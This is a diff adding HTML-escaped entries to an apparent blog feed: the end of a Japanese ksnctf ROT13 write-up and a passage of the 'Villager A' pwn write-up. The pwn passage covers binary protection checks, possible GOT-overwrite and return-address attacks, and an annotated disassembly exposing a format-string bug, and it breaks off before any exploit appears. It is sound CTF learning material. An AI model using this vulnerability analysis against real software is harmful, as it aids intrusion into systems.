+            &lt;span class=&quot;sc&quot;&gt;'Z'&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;=&amp;gt;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;plain&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;.push&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;sc&quot;&gt;'M'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;),&lt;/span&gt;
+            &lt;span class=&quot;mi&quot;&gt;_&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;=&amp;gt;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;plain&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;.push&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;c&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+        &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
+    &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
+
+    &lt;span class=&quot;nd&quot;&gt;println!&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;---- cryptogram ----&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+    &lt;span class=&quot;nd&quot;&gt;println!&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;{}&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;cryptogram&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+    &lt;span class=&quot;nd&quot;&gt;println!&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;---- plain ----&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+    &lt;span class=&quot;nd&quot;&gt;println!&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;{}&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;plain&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;　match 式のところが無理やりになってしまった。良い書き方をいろいろ考えたのだが、さっぱり分からなかった。ROT13よりもRustの文字列の扱いの方が遥かに謎深い。&lt;/p&gt;
+
+&lt;p&gt;　ともかく、これでFLAGを獲得出来た。クリア。&lt;/p&gt;
+
+&lt;h2 id=&quot;所感&quot;&gt;所感&lt;/h2&gt;
+
+&lt;p&gt;　CTFと言えば pwn だと同僚は言っていたのだが、pwnはさっぱり分からなかった。一方で crypto は規則性を見つける遊びのように当時感じて、crypto だけ解いてた。&lt;/p&gt;
+
+&lt;p&gt;　その時に、ROT13 にも触れた記憶があるのだが、ROT13の wiki を見るまで思い出すことはなかった。&lt;/p&gt;
+
+&lt;p&gt;　今回の問題は見ていたら解けてしまったパターンなので、あまり論理的ではないし、広い視野から問題を見つめたわけでもないので、正直微妙な手応えである。&lt;/p&gt;
+
+&lt;p&gt;　ただ、何はともあれ ksnctf の問題をちゃんと解けたのは実質これが初めてとなるので、良しとした。なんやかんやFLAGを見つけると嬉しいものである。&lt;/p&gt;
+
+&lt;p&gt;　次回の crypto では、ROT13を起点にして暗号の歴史でも紐解ければと思う。&lt;/p&gt;
+
+&lt;p&gt;　
+　
+　&lt;/p&gt;</content><author><name></name></author><category term="contents" /><category term="tech" /><category term="CTF_ksnctf" /></entry><entry><title type="html">ksnctf 004 Villager A</title><link href="/contents/tech/ctf_ksnctf/2021/05/18/004.html" rel="alternate" type="text/html" title="ksnctf 004 Villager A" /><published>2021-05-18T12:38:04+00:00</published><updated>2021-05-18T12:38:04+00:00</updated><id>/contents/tech/ctf_ksnctf/2021/05/18/004</id><content type="html" xml:base="/contents/tech/ctf_ksnctf/2021/05/18/004.html">&lt;h2 id=&quot;ksnctf-004-villager-a&quot;&gt;ksnctf 004 Villager A&lt;/h2&gt;
+&lt;ul&gt;
+  &lt;li&gt;問題公開日: 2012/05/26&lt;/li&gt;
+  &lt;li&gt;ジャンル: pwn&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;h3 id=&quot;謎解き&quot;&gt;謎解き&lt;/h3&gt;
+&lt;p&gt;　&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ssh&lt;/code&gt; で接続して向こうのサーバーで作業を行うスタイルのようだ。&lt;/p&gt;
+
+&lt;div class=&quot;language-sh highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;q4@eceec62b961b ~]&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;ls&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-l&lt;/span&gt;
+total 12
+&lt;span class=&quot;nt&quot;&gt;-r--r-----&lt;/span&gt; 1 root q4a   22 Feb 26 18:01 flag.txt
+&lt;span class=&quot;nt&quot;&gt;-r-xr-sr-x&lt;/span&gt; 1 root q4a 5857 Feb 26 18:01 q4
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;　目の前に &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;flag.txt&lt;/code&gt; があるが、ゲストに権限はない。 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;q4&lt;/code&gt; と言う実行ファイルから &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;flag.txt&lt;/code&gt; の中身を覗くことが出来るのだろう。&lt;/p&gt;
+
+&lt;div class=&quot;language-sh highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;q4@eceec62b961b ~]&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;file q4
+q4: setgid ELF 32-bit LSB executable, Intel 80386, version 1 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;SYSV&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;, dynamically linked, interpreter /lib/ld-linux.so.2, &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;GNU/Linux 2.6.18, BuildID[sha1]&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;526c75e7f0f34744808eb1b09a5a91880562efc8, not stripped
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;　&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;q4&lt;/code&gt; は 32bit の ELF ファイルのようだ。 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;not stripped&lt;/code&gt; のためシンボルも生きている。解析してくださいと言わんばかりである。&lt;/p&gt;
+
+&lt;p&gt;　ともかく、実行してみよう。&lt;/p&gt;
+
+&lt;div class=&quot;language-sh highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;q4@eceec62b961b ~]&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;./q4 
+What&lt;span class=&quot;s1&quot;&gt;'s your name?
+q4
+Hi, q4
+
+Do you want the flag?
+yes
+Do you want the flag?
+yes
+Do you want the flag?
+no
+I see. Good bye.
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;　名前を尋ねられた後、フラグが欲しいかという問いに答える。 何かを入力すると無限ループであり、&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;no&lt;/code&gt; と入力すると終わりのようだった。&lt;/p&gt;
+
+&lt;p&gt;　適切な入力を行えば &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;q4&lt;/code&gt; が &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;flag.txt&lt;/code&gt; を読み込んで表示してくれると思われる。&lt;/p&gt;
+
+&lt;p&gt;　ただし、適切と言っても、この実行ファイルの脆弱性を突くような文字列が今回の場合は適切な入力と考えて差し支えないだろう。これが &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;pwn&lt;/code&gt; と呼ばれるジャンルである。&lt;/p&gt;
+
+&lt;h3 id=&quot;セキュリティチェック&quot;&gt;セキュリティチェック&lt;/h3&gt;
+&lt;p&gt;　実行ファイルに関連するだろうセキュリティのチェックを行う。&lt;/p&gt;
+
+&lt;p&gt;　代表的なセキュリティは決まっており、一つ一つ確認してみようと思う。ここでは、私が用意した確認用シェルスクリプトを流す。調査に十分と思うが、適切でない可能性もあるので、各自でもシェルスクリプトが有効かどうかは判断して欲しい。&lt;/p&gt;
+
+&lt;div class=&quot;language-sh highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;q4@eceec62b961b ~]&lt;span class=&quot;nv&quot;&gt;$ FILE&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;q4&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\&lt;/span&gt;
+&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;--- 1: NX&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;           readelf &lt;span class=&quot;nt&quot;&gt;-l&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$FILE&lt;/span&gt; | &lt;span class=&quot;nb&quot;&gt;grep &lt;/span&gt;GNU_STACK&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\&lt;/span&gt;
+&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;--- 2: RELRO&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;        readelf &lt;span class=&quot;nt&quot;&gt;-l&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$FILE&lt;/span&gt; | &lt;span class=&quot;nb&quot;&gt;grep &lt;/span&gt;GNU_RELRO&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\&lt;/span&gt;
+&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;--- 3: Lazy binding&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; readelf &lt;span class=&quot;nt&quot;&gt;-d&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$FILE&lt;/span&gt; | &lt;span class=&quot;nb&quot;&gt;grep &lt;/span&gt;BIND_NOW&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\&lt;/span&gt;
+&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;--- 4: SSP, canary&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;  readelf &lt;span class=&quot;nt&quot;&gt;-s&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$FILE&lt;/span&gt; | &lt;span class=&quot;nb&quot;&gt;grep&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-e&lt;/span&gt; __stack_chk_fail &lt;span class=&quot;nt&quot;&gt;-e&lt;/span&gt; __intel_security_cookie&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\&lt;/span&gt;
+&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;--- 5: PIE&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;  file &lt;span class=&quot;nv&quot;&gt;$FILE&lt;/span&gt; | &lt;span class=&quot;nb&quot;&gt;grep &lt;/span&gt;shared&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\&lt;/span&gt;
+&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;--- 6: ASLR&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;         sysctl kernel.randomize_va_space | &lt;span class=&quot;nb&quot;&gt;grep &lt;/span&gt;2&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+
+&lt;span class=&quot;nt&quot;&gt;---&lt;/span&gt; 1: NX
+  GNU_STACK      0x000000 0x00000000 0x00000000 0x00000 0x00000 RW  0x4
+&lt;span class=&quot;nt&quot;&gt;---&lt;/span&gt; 2: RELRO
+&lt;span class=&quot;nt&quot;&gt;---&lt;/span&gt; 3: Lazy binding
+&lt;span class=&quot;nt&quot;&gt;---&lt;/span&gt; 4: SSP, canary
+&lt;span class=&quot;nt&quot;&gt;---&lt;/span&gt; 5: PIE
+&lt;span class=&quot;nt&quot;&gt;---&lt;/span&gt; 6: ASLR
+kernel.randomize_va_space &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; 2
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;　セキュリティの状態を表に書き起こすと、&lt;/p&gt;
+
+&lt;table&gt;
+  &lt;thead&gt;
+    &lt;tr&gt;
+      &lt;th&gt;セキュリティ&lt;/th&gt;
+      &lt;th&gt;状態&lt;/th&gt;
+      &lt;th&gt;説明&lt;/th&gt;
+    &lt;/tr&gt;
+  &lt;/thead&gt;
+  &lt;tbody&gt;
+    &lt;tr&gt;
+      &lt;td&gt;NX&lt;/td&gt;
+      &lt;td&gt;〇有効&lt;/td&gt;
+      &lt;td&gt;stack, heap領域での実行権限なし&lt;/td&gt;
+    &lt;/tr&gt;
+    &lt;tr&gt;
+      &lt;td&gt;RELRO&lt;/td&gt;
+      &lt;td&gt;✖無効&lt;/td&gt;
+      &lt;td&gt;GOT領域への書き込み権限あり&lt;/td&gt;
+    &lt;/tr&gt;
+    &lt;tr&gt;
+      &lt;td&gt;Lazy Binding&lt;/td&gt;
+      &lt;td&gt;〇有効&lt;/td&gt;
+      &lt;td&gt;got.plt にて遅延バインディング&lt;/td&gt;
+    &lt;/tr&gt;
+    &lt;tr&gt;
+      &lt;td&gt;SSP&lt;/td&gt;
+      &lt;td&gt;✖無効&lt;/td&gt;
+      &lt;td&gt;canary なし&lt;/td&gt;
+    &lt;/tr&gt;
+    &lt;tr&gt;
+      &lt;td&gt;PIE&lt;/td&gt;
+      &lt;td&gt;✖無効&lt;/td&gt;
+      &lt;td&gt;text領域等はランダム化されていない&lt;/td&gt;
+    &lt;/tr&gt;
+    &lt;tr&gt;
+      &lt;td&gt;ASLR&lt;/td&gt;
+      &lt;td&gt;〇有効&lt;/td&gt;
+      &lt;td&gt;stack, heap領域はランダム化されている&lt;/td&gt;
+    &lt;/tr&gt;
+  &lt;/tbody&gt;
+&lt;/table&gt;
+
+&lt;p&gt;　&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;NX&lt;/code&gt; が有効のため、シェルスクリプトを流し込むような手法は使えない。&lt;/p&gt;
+
+&lt;p&gt;　&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;RELRO&lt;/code&gt;, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Lazy Binding&lt;/code&gt; の状態から、これはいわゆる &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;no RELRO&lt;/code&gt;。GOT領域への書き込み(&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;GOT overwrite&lt;/code&gt;) の可能性を感じる。&lt;/p&gt;
+
+&lt;p&gt;　&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;SSP&lt;/code&gt; が無効のため、stack領域におけるリターンアドレスの書き換えも可能性がある。&lt;/p&gt;
+
+&lt;p&gt;　&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;PIE&lt;/code&gt; が無効のため、コードの任意アドレスにリターンするなどの可能性もある。&lt;/p&gt;
+
+&lt;p&gt;　&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ASLR&lt;/code&gt; が有効のため、stack, heap領域の位置を固定出来ないため、リターンアドレスを書き換えるためには少々手間がかかる。 32bit実行ファイルであることからブルートフォースによる攻略も考えられる。&lt;/p&gt;
+
+&lt;p&gt;　以上が今回対峙することになるだろうセキュリティの状態である。&lt;/p&gt;
+
+&lt;h3 id=&quot;脆弱性の探索&quot;&gt;脆弱性の探索&lt;/h3&gt;
+
+&lt;p&gt;　実行ファイルに内在する脆弱性を探す。CTFとなれば大抵何かしらの脆弱性が隠れているものである。&lt;/p&gt;
+
+&lt;p&gt;　脆弱性を当てずっぽうで探し当てても良いだろうし、挙動から推察しても良いのだが、今回は逆アセンブルする。&lt;/p&gt;
+
+&lt;p&gt;　アセンブリを読むのは今回が実質初めてである。分かった範囲でC言語風に1行ずつコメントを付けた。参考にして欲しい。変数名やラベル名は私が好きにつけているので好きにしてほしい。&lt;/p&gt;
+
+&lt;p&gt;　特に &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;main&lt;/code&gt; 関数について逆アセンブル( &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;objdumpt -d&lt;/code&gt; した結果を示す。&lt;/p&gt;
+
+&lt;div class=&quot;language-sh highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;q4@eceec62b961b ~]&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;objdump &lt;span class=&quot;nt&quot;&gt;-d&lt;/span&gt; q4
+
+q4:     file format elf32-i386
+
+Disassembly of section .init:
+ ...
+
+ ...
+ 80485b3:       c3                      ret
+
+080485b4 &amp;lt;main&amp;gt;:
+ 80485b4:       55                      push   %ebp
+ 80485b5:       89 e5                   mov    %esp,%ebp
+ 80485b7:       83 e4 f0                and    &lt;span class=&quot;nv&quot;&gt;$0xfffffff0&lt;/span&gt;,%esp
+ 80485ba:       81 ec 20 04 00 00       sub    &lt;span class=&quot;nv&quot;&gt;$0x420&lt;/span&gt;,%esp                  &lt;span class=&quot;c&quot;&gt;# main関数内の変数（引数, ???, ローカル変数）の合計は 0x420 byte&lt;/span&gt;
+ 80485c0:       c7 04 24 a4 87 04 08    movl   &lt;span class=&quot;nv&quot;&gt;$0x80487a4&lt;/span&gt;,&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;%esp&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;            &lt;span class=&quot;c&quot;&gt;#   引数1 &quot;What's your name?&quot;&lt;/span&gt;
+ 80485c7:       e8 f8 fe ff ff          call   80484c4 &amp;lt;puts@plt&amp;gt;           &lt;span class=&quot;c&quot;&gt;# puts(&quot;What's your name?&quot;)&lt;/span&gt;
+ 80485cc:       a1 04 9a 04 08          mov    0x8049a04,%eax               &lt;span class=&quot;c&quot;&gt;#   引数3 stdin&lt;/span&gt;
+ 80485d1:       89 44 24 08             mov    %eax,0x8&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;%esp&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+ 80485d5:       c7 44 24 04 00 04 00    movl   &lt;span class=&quot;nv&quot;&gt;$0x400&lt;/span&gt;,0x4&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;%esp&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;             &lt;span class=&quot;c&quot;&gt;#   引数2 0x400 = 1024&lt;/span&gt;
+ 80485dc:       00
+ 80485dd:       8d 44 24 18             lea    0x18&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;%esp&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;,%eax              &lt;span class=&quot;c&quot;&gt;#   引数1 char input[400]&lt;/span&gt;
+ 80485e1:       89 04 24                mov    %eax,&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;%esp&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+ 80485e4:       e8 9b fe ff ff          call   8048484 &amp;lt;fgets@plt&amp;gt;          &lt;span class=&quot;c&quot;&gt;# fgets(input, 1024, stdin)&lt;/span&gt;
+ 80485e9:       c7 04 24 b6 87 04 08    movl   &lt;span class=&quot;nv&quot;&gt;$0x80487b6&lt;/span&gt;,&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;%esp&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;            &lt;span class=&quot;c&quot;&gt;#   引数1 &quot;Hi, &quot;&lt;/span&gt;
+ 80485f0:       e8 bf fe ff ff          call   80484b4 &amp;lt;&lt;span class=&quot;nb&quot;&gt;printf&lt;/span&gt;@plt&amp;gt;         &lt;span class=&quot;c&quot;&gt;# printf(&quot;Hi, &quot;)&lt;/span&gt;
+ 80485f5:       8d 44 24 18             lea    0x18&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;%esp&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;,%eax              &lt;span class=&quot;c&quot;&gt;#   引数1 char input[400]&lt;/span&gt;
+ 80485f9:       89 04 24                mov    %eax,&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;%esp&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+ 80485fc:       e8 b3 fe ff ff          call   80484b4 &amp;lt;&lt;span class=&quot;nb&quot;&gt;printf&lt;/span&gt;@plt&amp;gt;         &lt;span class=&quot;c&quot;&gt;# printf(input)&lt;/span&gt;
+ 8048601:       c7 04 24 0a 00 00 00    movl   &lt;span class=&quot;nv&quot;&gt;$0xa&lt;/span&gt;,&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;%esp&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;                  &lt;span class=&quot;c&quot;&gt;#   引数1 &quot;\n&quot;&lt;/span&gt;
+ 8048608:       e8 67 fe ff ff          call   8048474 &amp;lt;putchar@plt&amp;gt;        &lt;span class=&quot;c&quot;&gt;# putchar(&quot;\n&quot;)&lt;/span&gt;
+ 804860d:       c7 84 24 18 04 00 00    movl   &lt;span class=&quot;nv&quot;&gt;$0x1&lt;/span&gt;,0x418&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;%esp&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;             &lt;span class=&quot;c&quot;&gt;# int canFlag = 1&lt;/span&gt;
+                                                                            &lt;span class=&quot;c&quot;&gt;# ↑ 後の動きも加味して適当に変数名をつけている&lt;/span&gt;
+ 8048614:       01 00 00 00
+ 8048618:       eb 67                   jmp    8048681 &amp;lt;main+0xcd&amp;gt;          &lt;span class=&quot;c&quot;&gt;# goto FLAG&lt;/span&gt;
+
+ 804861a:       c7 04 24 bb 87 04 08    movl   &lt;span class=&quot;nv&quot;&gt;$0x80487bb&lt;/span&gt;,&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;%esp&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;    &lt;span class=&quot;c&quot;&gt;# LOOP: #   引数1 &quot;Do you want the flag?&quot;&lt;/span&gt;
+ 8048621:       e8 9e fe ff ff          call   80484c4 &amp;lt;puts@plt&amp;gt;           &lt;span class=&quot;c&quot;&gt;# puts(&quot;Do you want the flag?&quot;)&lt;/span&gt;
+ 8048626:       a1 04 9a 04 08          mov    0x8049a04,%eax               &lt;span class=&quot;c&quot;&gt;#   引数3 stdin&lt;/span&gt;
+ 804862b:       89 44 24 08             mov    %eax,0x8&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;%esp&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+ 804862f:       c7 44 24 04 00 04 00    movl   &lt;span class=&quot;nv&quot;&gt;$0x400&lt;/span&gt;,0x4&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;%esp&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;             &lt;span class=&quot;c&quot;&gt;#   引数2 0x400 = 1024&lt;/span&gt;
+ 8048636:       00
+ 8048637:       8d 44 24 18             lea    0x18&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;%esp&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;,%eax              &lt;span class=&quot;c&quot;&gt;#   引数1 char input[400]&lt;/span&gt;
+ 804863b:       89 04 24                mov    %eax,&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;%esp&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+ 804863e:       e8 41 fe ff ff          call   8048484 &amp;lt;fgets@plt&amp;gt;          &lt;span class=&quot;c&quot;&gt;# fgets(input, 1024, stdin)&lt;/span&gt;
+ 8048643:       85 c0                   &lt;span class=&quot;nb&quot;&gt;test&lt;/span&gt;   %eax,%eax
+ 8048645:       0f 94 c0                sete   %al
+ 8048648:       84 c0                   &lt;span class=&quot;nb&quot;&gt;test&lt;/span&gt;   %al,%al
+ 804864a:       74 0a                   je     8048656 &amp;lt;main+0xa2&amp;gt;          &lt;span class=&quot;c&quot;&gt;# goto CMP&lt;/span&gt;
+ 804864c:       b8 00 00 00 00          mov    &lt;span class=&quot;nv&quot;&gt;$0x0&lt;/span&gt;,%eax
+ 8048651:       e9 86 00 00 00          jmp    80486dc &amp;lt;main+0x128&amp;gt;         &lt;span class=&quot;c&quot;&gt;# goto END&lt;/span&gt;
+
+ 8048656:       c7 44 24 04 d1 87 04    movl   &lt;span class=&quot;nv&quot;&gt;$0x80487d1&lt;/span&gt;,0x4&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;%esp&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;c&quot;&gt;# CMP:  #   引数2 &quot;no&quot;&lt;/span&gt;
+ 804865d:       08
+ 804865e:       8d 44 24 18             lea    0x18&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;%esp&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;,%eax              &lt;span class=&quot;c&quot;&gt;#   引数1 char input[400]&lt;/span&gt;
+ 8048662:       89 04 24                mov    %eax,&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;%esp&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+ 8048665:       e8 7a fe ff ff          call   80484e4 &amp;lt;strcmp@plt&amp;gt;         &lt;span class=&quot;c&quot;&gt;# if(strcmp(input, &quot;no&quot;) != 0)&lt;/span&gt;
+ 804866a:       85 c0                   &lt;span class=&quot;nb&quot;&gt;test&lt;/span&gt;   %eax,%eax                    &lt;span class=&quot;c&quot;&gt;#   ↓&lt;/span&gt;
+ 804866c:       75 13                   jne    8048681 &amp;lt;main+0xcd&amp;gt;          &lt;span class=&quot;c&quot;&gt;# goto FLAG&lt;/span&gt;
+                                                                            &lt;span class=&quot;c&quot;&gt;# ↓↓↓↓ ------ else --------- ↓↓↓↓&lt;/span&gt;
+ 804866e:       c7 04 24 d5 87 04 08    movl   &lt;span class=&quot;nv&quot;&gt;$0x80487d5&lt;/span&gt;,&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;%esp&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;            &lt;span class=&quot;c&quot;&gt;#   引数1 &quot;I see. Good bye&quot;&lt;/span&gt;
+ 8048675:       e8 4a fe ff ff          call   80484c4 &amp;lt;puts@plt&amp;gt;           &lt;span class=&quot;c&quot;&gt;# puts(&quot;I see. Good bye&quot;)&lt;/span&gt;
+ 804867a:       b8 00 00 00 00          mov    &lt;span class=&quot;nv&quot;&gt;$0x0&lt;/span&gt;,%eax
+ 804867f:       eb 5b                   jmp    80486dc &amp;lt;main+0x128&amp;gt;         &lt;span class=&quot;c&quot;&gt;# goto END&lt;/span&gt;
+                                                                            &lt;span class=&quot;c&quot;&gt;# ↑↑↑↑ --------------------- ↑↑↑↑&lt;/span&gt;
+
+ 8048681:       8b 84 24 18 04 00 00    mov    0x418&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;%esp&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;,%eax     &lt;span class=&quot;c&quot;&gt;# FLAG: # if(canFlag == 1)&lt;/span&gt;
+ 8048688:       85 c0                   &lt;span class=&quot;nb&quot;&gt;test&lt;/span&gt;   %eax,%eax                    &lt;span class=&quot;c&quot;&gt;#   ↓ canFlag(0x418) は 1 に初期化されている&lt;/span&gt;
+ 804868a:       0f 95 c0                setne  %al                          &lt;span class=&quot;c&quot;&gt;#   ↓ 従って必ず式の結果は true&lt;/span&gt;
